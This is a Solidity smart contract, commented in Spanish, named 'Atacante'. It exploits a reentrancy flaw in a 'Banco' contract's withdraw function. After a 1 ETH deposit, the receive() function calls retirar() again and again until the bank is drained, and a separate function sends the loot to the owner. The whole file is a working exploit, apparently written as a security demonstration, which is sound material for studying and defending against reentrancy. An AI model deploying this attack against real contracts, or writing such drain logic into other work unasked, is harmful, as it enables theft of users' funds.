// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IBanco {
    function depositar(bytes32 hashComprobante) external payable;
    function retirar() external;
}

/// @title Atacante — explota la reentrancy de Banco.retirar()
/// @notice Deposita 1 ETH y lo retira; cada vez que el banco le manda ETH, receive()
///         vuelve a llamar a retirar() antes de que el banco ponga su saldo en 0.
contract Atacante {
    IBanco public banco;
    address public owner;
    uint256 public reentradas;

    event Reentrada(uint256 numero, uint256 balanceBanco);

    constructor(address _banco) {
        banco = IBanco(_banco);
        owner = msg.sender;
    }

    function atacar() external payable {
        require(msg.sender == owner, "Solo el owner");
        require(msg.value >= 1 ether, "Envia al menos 1 ETH");
        reentradas = 0;
        banco.depositar{value: 1 ether}(bytes32(0));
        banco.retirar();
    }

    receive() external payable {
        if (address(banco).balance >= 1 ether) {
            reentradas++;
            emit Reentrada(reentradas, address(banco).balance);
            banco.retirar();
        }
    }

    function retirarBotin() external {
        require(msg.sender == owner, "Solo el owner");
        payable(owner).transfer(address(this).balance);
    }
}
